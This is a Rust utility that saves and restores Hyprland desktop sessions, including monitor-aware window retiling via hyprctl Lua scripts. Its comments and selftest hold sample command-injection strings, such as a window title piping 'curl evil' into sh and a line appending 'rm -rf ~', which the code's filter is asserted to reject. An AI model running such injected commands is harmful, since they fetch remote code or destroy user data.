//! Monitor-aware Hyprland session save/restore (Rust wrapper over hyprsession).
//!
//! save          -> snapshot the open windows (hyprsession) + current monitor
//!                  layout, then strip entries that cannot be relaunched
//!                  (Proton games, Steam phantom windows) so a restore never
//!                  tries to launch garbage. Never overwrites a good snapshot
//!                  with an empty one.
//! restore       -> nothing open        : launch the snapshot's apps, then place
//!                                       them. Exact pixels when the monitor
//!                                       layout matches, retile when it changed.
//!                  windows already open: retile them to the snapshot layout and
//!                                       close nothing.
//! retile-open   -> same retile step alone.
//! autosave-loop -> save every AUTOSAVE_SECS, silently (started by
//!                  hyprland.start, flock-guarded so it starts exactly once).
//!
//! Hyprland 0.56 dropped classic dispatchers: `hyprctl dispatch "exec foo"` and
//! even the raw IPC socket are Lua-backed now and reject any dispatcher with
//! arguments, so upstream `hyprsession load` kills every window and relaunches
//! nothing. All mutation here therefore goes through one `hyprctl repl` Lua
//! script using `hl.dsp.*`, which can target a specific window by object (no
//! focus stealing) -- see the API notes above retile_lua().
//!
//! --notify pops a desktop notification; the manual keybinds pass it, the
//! automatic paths stay quiet.
//!
//! std-only on purpose: compile with `rustc -O --edition 2021`, no crates.
//! JSON is handled by jq so no JSON parser lives in this file.

use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{exit, Command};
use std::thread;
use std::time::Duration;

const SESSION: &str = "default";
const HYPRCTL: &str = "/usr/bin/hyprctl";
const JQ: &str = "/usr/bin/jq";
const NOTIFY: &str = "/usr/bin/notify-send";
const AUTOSAVE_SECS: u64 = 300;
// Only layout-defining fields, normalised so ordering can't cause a mismatch.
const FINGERPRINT_JQ: &str = "sort_by(.name) | map([.name,.x,.y,.width,.height,.scale])";
// One TSV row per window. Kept in jq so Rust stays parser-free; Rust only needs
// the fields below and splits on tabs. `workspace.name` doubles as the selector
// we hand back to Hyprland ("3" or "special:scratch") -- correct for both.
const WINDOWS_TSV_JQ: &str = ".[] | [.address,.class,(.at[0]|tostring),(.at[1]|tostring),(.size[0]|tostring),(.size[1]|tostring),(.floating|tostring),(.pinned|tostring),(.fullscreen|tostring),(.workspace.name // \"\")] | @tsv";

fn home() -> PathBuf {
    PathBuf::from(env::var("HOME").expect("HOME not set"))
}

fn base() -> PathBuf {
    home().join(".local/share/hyprsession")
}

fn hyprsession() -> PathBuf {
    home().join(".local/bin/hyprsession")
}

/// Shell-quote a path for the `/bin/sh -c` helpers below.
fn q(p: &Path) -> String {
    format!("'{}'", p.display().to_string().replace('\'', r"'\''"))
}

/// Run a shell command, returning stdout only on success.
fn sh(cmd: &str) -> Option<String> {
    let out = Command::new("/bin/sh").arg("-c").arg(cmd).output().ok()?;
    if !out.status.success() {
        return None;
    }
    Some(String::from_utf8_lossy(&out.stdout).to_string())
}

/// Desktop notification; used only by the manual keybinds (--notify).
fn notify_user(summary: &str, body: &str) {
    let _ = Command::new(NOTIFY)
        .args(["-a", "hypr-session", summary, body])
        .status();
}

/// Normalised monitor layout, e.g. `[["DP-1",1920,0,3840,2160,2],...]`.
fn fingerprint() -> Option<String> {
    let cmd = format!("{HYPRCTL} monitors -j | {JQ} -c '{FINGERPRINT_JQ}'");
    sh(&cmd).map(|s| s.trim().to_string())
}

/// Did the monitors stay put since the snapshot? Decides whether saved pixel
/// geometry is still meaningful or only the tiling should be restored.
fn monitors_unchanged() -> bool {
    let saved = fs::read_to_string(base().join(SESSION).join("monitors.json"))
        .ok()
        .map(|s| s.trim().to_string());
    saved.is_some() && saved == fingerprint()
}

fn client_count() -> Option<usize> {
    sh(&format!("{HYPRCTL} clients -j | {JQ} 'length'"))?.trim().parse().ok()
}

/// A window, from either `hyprctl clients -j` or a saved `clients.json`.
#[derive(Clone)]
struct Win {
    addr: String,
    class: String,
    wsname: String,
    x: i64,
    y: i64,
    w: i64,
    h: i64,
    floating: bool,
    pinned: bool,
    fullscreen: i64,
}

fn parse_windows(tsv: &str) -> Vec<Win> {
    tsv.lines()
        .filter_map(|line| {
            let f: Vec<&str> = line.split('\t').collect();
            if f.len() < 10 {
                return None;
            }
            Some(Win {
                addr: f[0].to_string(),
                class: f[1].to_string(),
                x: f[2].parse().ok()?,
                y: f[3].parse().ok()?,
                w: f[4].parse().ok()?,
                h: f[5].parse().ok()?,
                floating: f[6] == "true",
                pinned: f[7] == "true",
                fullscreen: f[8].parse().ok()?,
                wsname: f[9].to_string(),
            })
        })
        .collect()
}

fn saved_windows(dir: &Path) -> Vec<Win> {
    let path = dir.join("clients.json");
    sh(&format!("{JQ} -r '{WINDOWS_TSV_JQ}' {}", q(&path)))
        .map(|t| parse_windows(&t))
        .unwrap_or_default()
}

/// Drop anything that cannot be relaunched, so restore never launches garbage:
///  * Windows-path commands (`S:\...\game.exe`, `C:\windows\...`) -- Proton
///    games and Steam's phantom `explorer.exe /desktop` overlay window.
///  * Any client whose class starts `steam_app` (a Steam game), and its
///    matching exec line, located by the geometry that was copied verbatim.
fn filter_exec(text: &str, banned: &[String]) -> Vec<String> {
    text.lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .filter(|l| !(l.contains('\\') || l.contains(".exe")))
        // Also drops lines whose command carries shell metacharacters (see
        // shell_unsafe): a window class/title cannot smuggle a payload in.
        .filter(|l| exec_cmd_only(l).is_some())
        .filter(|l| !banned.iter().any(|b| l.contains(b.as_str())))
        .map(str::to_string)
        .collect()
}

/// Characters that turn a launch command into arbitrary shell code. `exec.conf`
/// is written by upstream hyprsession from window classes/titles (`fetch_command`
/// returns them raw), so a window named `kitty ; curl evil | sh` would otherwise
/// execute that payload on restore -- `hl.exec_cmd` runs via `/bin/sh`.
fn shell_unsafe(cmd: &str) -> bool {
    cmd.chars().any(|c| matches!(c, ';' | '&' | '|' | '$' | '`' | '>' | '<' | '(' | ')' | '{' | '}' | '\n' | '\r'))
}

/// The launchable command from a hyprsession exec line, dropping its `[props]`
/// prefix. Placement is the retile engine's job, not the exec rule's. Refused
/// (None) rather than quoted when it carries shell metacharacters, so nothing
/// window-derived can ever reach the shell.
fn exec_cmd_only(line: &str) -> Option<String> {
    let line = line.trim();
    if line.is_empty() {
        return None;
    }
    let cmd = match line.strip_prefix('[') {
        Some(rest) => match rest.split_once("] ") {
            Some((_, cmd)) => cmd.trim(),
            None => return None,
        },
        None => line,
    };
    if cmd.is_empty() || shell_unsafe(cmd) {
        return None;
    }
    Some(cmd.to_string())
}

/// A Lua string literal.
fn lua_str(s: &str) -> String {
    let mut o = String::from("\"");
    for c in s.chars() {
        match c {
            '"' => o.push_str("\\\""),
            '\\' => o.push_str("\\\\"),
            '\n' => o.push_str("\\n"),
            '\r' => {}
            _ => o.push(c),
        }
    }
    o.push('"');
    o
}

/// A Lua table of the snapshot, read by RETILE_ENGINE. `fl`/`pin` must be real
/// Lua booleans -- `0` is truthy in Lua, so emitting numbers would float and pin
/// every window.
fn lua_table(saved: &[Win]) -> String {
    let mut o = String::from("local saved = {\n");
    for w in saved {
        o.push_str(&format!(
            "  {{addr={},cls={},ws={},x={},y={},w={},h={},fl={},pin={},fs={}}},\n",
            lua_str(&w.addr),
            lua_str(&w.class),
            lua_str(&w.wsname),
            w.x,
            w.y,
            w.w,
            w.h,
            w.floating,
            w.pinned,
            w.fullscreen,
        ));
    }
    o.push_str("}\n");
    o
}

/// The retile engine, run inside `hyprctl repl`.
///
/// API notes (verified live against Hyprland 0.56.2):
///  * `hl.get_windows()` -> every client, on any workspace/monitor.
///  * The optional `window = <HL.Window|"address:0x..">` key is consumed by the
///    upvalue helper for every `hl.dsp.window.*`, so a specific window can be
///    addressed without focusing it.
///  * `move({x,y,relative=false})` sets an exact global position;
///    `resize({x,y,relative=false})` sets an exact size but re-centers the
///    window, so move must come after resize.
///  * Both move and resize refuse a fullscreen window, so fullscreen is cleared
///    first when a move is needed and re-applied last.
///  * Tiled windows get no pixel dispatches -- Hyprland tiles them from the
///    workspace it lands on.
const RETILE_ENGINE: &str = r##"
local live = hl.get_windows()
local used = {}
local function find(e)
  for i = 1, #live do
    local w = live[i]
    if not used[i] and w.address == e.addr then return i, w end
  end
  for i = 1, #live do
    local w = live[i]
    if not used[i] and w.class == e.cls then return i, w end
  end
  return nil, nil
end
local matched = 0
for _, e in ipairs(saved) do
  local i, w = find(e)
  if w then
    used[i] = true
    matched = matched + 1
    local fs = w.fullscreen or 0
    local cur = (w.workspace and w.workspace.name) or ""
    local move_to = e.ws ~= "" and cur ~= e.ws
    if fs ~= 0 and (move_to or e.fl) then
      hl.dispatch(hl.dsp.window.fullscreen_state({ window = w, internal = 0, client = 0, action = "set" }))
      fs = 0
    end
    if move_to then
      hl.dispatch(hl.dsp.window.move({ window = w, workspace = e.ws, follow = false }))
    end
    if w.floating ~= e.fl then
      hl.dispatch(hl.dsp.window.float({ window = w, action = e.fl and "enable" or "disable" }))
    end
    if exact and e.fl and fs == 0 then
      hl.dispatch(hl.dsp.window.resize({ window = w, x = e.w, y = e.h, relative = false }))
      hl.dispatch(hl.dsp.window.move({ window = w, x = e.x, y = e.y, relative = false }))
    end
    if e.pin ~= w.pinned then
      hl.dispatch(hl.dsp.window.pin({ window = w, action = e.pin and "enable" or "disable" }))
    end
    if e.fs ~= 0 and fs == 0 then
      hl.dispatch(hl.dsp.window.fullscreen_state({ window = w, internal = e.fs, client = 0, action = "set" }))
    end
  end
end
return matched
"##;

fn retile_lua(saved: &[Win], exact: bool) -> String {
    let mut lua = format!("local exact = {exact}\n");
    lua.push_str(&lua_table(saved));
    lua.push_str(RETILE_ENGINE);
    lua
}

/// Run a Lua chunk through Hyprland and return whatever it `return`s.
/// `repl` prints the result; it exits 0 even on a Lua error, so the error text
/// (which goes to stdout) is what we check.
fn run_lua(lua: &str) -> Result<String, String> {
    let out = Command::new(HYPRCTL)
        .args(["repl", lua])
        .output()
        .map_err(|e| format!("could not run hyprctl: {e}"))?;
    let stdout = String::from_utf8_lossy(&out.stdout);
    let stdout = stdout.trim();
    if stdout.starts_with("error:") {
        return Err(stdout.to_string());
    }
    if !out.status.success() {
        let err = String::from_utf8_lossy(&out.stderr);
        return Err(format!("hyprctl repl failed: {}", err.trim()));
    }
    Ok(stdout.to_string())
}

/// Put every open window back where the snapshot had it. Returns how many
/// snapshot entries found their window. Never closes anything.
fn apply_retile(exact: bool) -> Result<usize, String> {
    let saved = saved_windows(&base().join(SESSION));
    if saved.is_empty() {
        return Err("nothing saved yet - press Super+Ctrl+S first".into());
    }
    let out = run_lua(&retile_lua(&saved, exact))?;
    Ok(out.parse().unwrap_or(0))
}

/// Nothing was open: launch the snapshot's apps, then let the retile engine
/// place each one as it appears (matches by class, so staggering is fine).
fn launch_snapshot(exact: bool) -> Result<usize, String> {
    let text = fs::read_to_string(base().join(SESSION).join("exec.conf")).map_err(|e| e.to_string())?;
    let cmds: Vec<String> = text.lines().filter_map(exec_cmd_only).collect();
    if cmds.is_empty() {
        return Err("snapshot has no launchable apps".into());
    }
    let mut lua = String::from("local cmds = {\n");
    for c in &cmds {
        lua.push_str(&format!("  {},\n", lua_str(c)));
    }
    lua.push_str("}\nfor _, c in ipairs(cmds) do hl.exec_cmd(c) end\nreturn #cmds\n");
    run_lua(&lua)?;
    let want = saved_windows(&base().join(SESSION)).len();
    for _ in 0..15 {
        thread::sleep(Duration::from_millis(700));
        if apply_retile(exact).unwrap_or(0) >= want {
            break;
        }
    }
    Ok(cmds.len())
}

/// Remove unrelaunchable entries from a just-written snapshot. Returns false
/// when the sanitized snapshot is empty and the previous one was kept.
fn sanitize(dir: &Path) -> Result<bool, String> {
    let cj = dir.join("clients.json");
    // Geometry of the Steam-game clients, captured before they are dropped:
    // each `move X Y` is copied verbatim into the exec line, so a substring
    // match finds the line.
    let banned: Vec<String> = sh(&format!(
        "{JQ} -r '.[] | select((.class // \"\") | startswith(\"steam_app\")) | \"move \\(.at[0]) \\(.at[1])\"' {}",
        q(&cj)
    ))
    .map(|s| s.lines().map(|l| l.trim().to_string()).filter(|l| !l.is_empty()).collect())
    .unwrap_or_default();

    if let Some(filtered) = sh(&format!(
        "{JQ} -c '[.[] | select(((.class // \"\") | startswith(\"steam_app\")) | not)]' {}",
        q(&cj)
    )) {
        fs::write(&cj, filtered.trim()).map_err(|e| e.to_string())?;
    }

    let ec = dir.join("exec.conf");
    let text = fs::read_to_string(&ec).unwrap_or_default();
    // An empty exec.conf is NOT a valid snapshot -- it is exactly the "closed
    // every window, then shut down" case. Fall through to Ok(false) so save()
    // restores the previous snapshot instead of wiping it.
    let kept = filter_exec(&text, &banned);
    if kept.is_empty() {
        return Ok(false);
    }
    let mut out = kept.join("\n");
    out.push('\n');
    fs::write(&ec, out).map_err(|e| e.to_string())?;
    Ok(true)
}

fn save(notify: bool) -> Result<(), String> {
    let dir = base().join(SESSION);
    fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    // Held in case this snapshot sanitizes down to nothing (see below).
    let prev_exec = fs::read_to_string(dir.join("exec.conf")).ok();
    let prev_clients = fs::read_to_string(dir.join("clients.json")).ok();

    let status = Command::new(hyprsession())
        .args(["save", SESSION])
        .status()
        .map_err(|e| format!("failed to run hyprsession: {e}"))?;
    if !status.success() {
        return Err("hyprsession save failed".into());
    }

    let fp = fingerprint().ok_or("could not read monitor layout")?;
    fs::write(dir.join("monitors.json"), &fp).map_err(|e| e.to_string())?;

    if !sanitize(&dir)? {
        // Nothing relaunchable was open; keep the last good snapshot instead of
        // replacing it with an empty one (closing every window, then shutting
        // down, must not wipe the session you want to restore).
        if let Some(p) = prev_exec.filter(|p| !p.trim().is_empty()) {
            fs::write(dir.join("exec.conf"), p).map_err(|e| e.to_string())?;
        }
        if let Some(p) = prev_clients {
            fs::write(dir.join("clients.json"), p).map_err(|e| e.to_string())?;
        }
        println!("kept previous snapshot (nothing relaunchable open)");
    }

    println!("saved session {SESSION}");
    if notify {
        notify_user("Session saved", "Windows + monitor layout snapshotted");
    }
    Ok(())
}

fn restore(notify: bool) -> Result<(), String> {
    if !base().join(SESSION).join("exec.conf").exists() {
        return Err("nothing saved yet - press Super+Ctrl+S first".into());
    }
    let exact = monitors_unchanged();

    // Windows already open: never relaunch or close anything, just put the open
    // ones back where the snapshot had them.
    match client_count() {
        Some(open) if open > 0 => {
            let matched = apply_retile(exact)?;
            println!("retiled {matched} of {open} open windows (nothing closed)");
            if notify {
                notify_user("Session retiled", &format!("{matched} matched, {open} kept - nothing closed"));
            }
            return Ok(());
        }
        // Known empty: fresh boot, launch the snapshot.
        Some(_) => {}
        // Unknown (hyprctl could not answer): launching would risk duplicating
        // every window that is actually open, so refuse instead.
        None => return Err("cannot read the Hyprland client list; not launching (would risk duplicates)".into()),
    }

    let count = launch_snapshot(exact)?;
    println!("launched {count} app(s)");
    if notify {
        notify_user(
            "Session restored",
            if exact {
                "Exact layout (monitors unchanged)"
            } else {
                "Monitors changed - apps retiled"
            },
        );
    }
    Ok(())
}

fn autosave_loop() -> ! {
    loop {
        // Sleep first: at login the apps are still launching, so saving
        // immediately would snapshot a partial session and overwrite the good
        // one ("Save misses apps"). The previous snapshot stays valid until the
        // first full save.
        thread::sleep(Duration::from_secs(AUTOSAVE_SECS));
        if let Err(e) = save(false) {
            eprintln!("hypr-session autosave: {e}");
        }
    }
}

fn selftest() {
    // Launchable command survives its `[props]` prefix, or has none.
    assert_eq!(exec_cmd_only("[monitor 1;workspace 2 silent;move 3840 0] firefox").as_deref(), Some("firefox"));
    assert_eq!(exec_cmd_only("kitty opencode").as_deref(), Some("kitty opencode"));
    assert_eq!(exec_cmd_only("   ").as_deref(), None);
    assert_eq!(exec_cmd_only("[monitor 1] steam").as_deref(), Some("steam"));

    // Window-derived commands carrying shell metacharacters are refused.
    assert_eq!(exec_cmd_only("[monitor 1] kitty; touch /tmp/pwn").as_deref(), None);
    assert_eq!(exec_cmd_only("[monitor 1] sh -c $(curl evil)").as_deref(), None);
    assert_eq!(exec_cmd_only("firefox | tee /tmp/x").as_deref(), None);
    // ...and filter_exec drops them, while keeping a clean line.
    assert_eq!(filter_exec("[monitor 1] steam\n[monitor 1] kitty; rm -rf ~\n", &[]), vec!["[monitor 1] steam"]);
    // An empty snapshot has nothing to keep -> save() restores the previous one.
    assert!(filter_exec("", &[]).is_empty());

    // Over-eager quote users must not break the generated Lua.
    assert_eq!(lua_str(r#"kitty "hi" \ there"#), r#""kitty \"hi\" \\ there""#);
    assert_eq!(lua_str("a\nb"), r#""a\nb""#);

    // Proton games and Steam phantoms must never survive a save.
    let text = concat!(
        "[monitor 0;move 1920 0;size 1920 1080] S:\\steamapps\\common\\RidersRepublic\\RidersRepublic.exe /belaunch\n",
        "[monitor 0;move 1922 15;size 80 10;float] C:\\windows\\system32\\explorer.exe /desktop\n",
        "[monitor 2;move 8 42;size 947 1030] steam\n",
        "[monitor 2;move 965 42;size 947 1030] kitty\n",
    );
    let kept = filter_exec(text, &[]);
    assert_eq!(kept, vec!["[monitor 2;move 8 42;size 947 1030] steam", "[monitor 2;move 965 42;size 947 1030] kitty"]);
    // A native Steam game is caught by its saved geometry instead.
    let kept = filter_exec(
        "[monitor 0;move 100 100;size 800 600] /home/maxii/.steam/steamapps/common/Game/game\n",
        &["move 100 100".to_string()],
    );
    assert!(kept.is_empty());

    // The saved table must round-trip into the Lua the engine reads.
    let w = Win {
        addr: "0x1".into(),
        class: "kitty".into(),
        wsname: "3".into(),
        x: 965,
        y: 42,
        w: 947,
        h: 1030,
        floating: false,
        pinned: true,
        fullscreen: 2,
    };
    assert_eq!(
        lua_table(&[w.clone()]),
        "local saved = {\n  {addr=\"0x1\",cls=\"kitty\",ws=\"3\",x=965,y=42,w=947,h=1030,fl=false,pin=true,fs=2},\n}\n"
    );
    assert!(retile_lua(&[w], true).starts_with("local exact = true\nlocal saved = {\n"));
    assert!(retile_lua(&[], false).starts_with("local exact = false\n"));
    assert!(RETILE_ENGINE.contains("hl.dsp.window.move({ window = w, x = e.x, y = e.y, relative = false })"));

    println!("selftest ok");
}

fn main() {
    let args: Vec<String> = env::args().collect();
    let notify = args.iter().any(|a| a == "--notify" || a == "-n");
    match args.get(1).map(String::as_str) {
        Some("save") => save(notify).unwrap_or_else(|e| fail(&e, notify)),
        Some("restore") => restore(notify).unwrap_or_else(|e| fail(&e, notify)),
        Some("selftest") => selftest(),
        // Retile the currently open windows onto the saved layout; closes nothing.
        Some("retile-open") => match apply_retile(monitors_unchanged()) {
            Ok(n) => println!("retile-open: {n} window(s) matched"),
            Err(e) => fail(&e, notify),
        },
        // Silent periodic snapshot; started once from hyprland.start under flock.
        Some("autosave-loop") => autosave_loop(),
        _ => {
            eprintln!("usage: hypr-session {{save|restore|retile-open|autosave-loop|selftest}} [--notify]");
            exit(2);
        }
    }
}

fn fail(msg: &str, notify: bool) -> ! {
    eprintln!("hypr-session: {msg}");
    if notify {
        notify_user("hypr-session failed", msg);
    }
    exit(1);
}
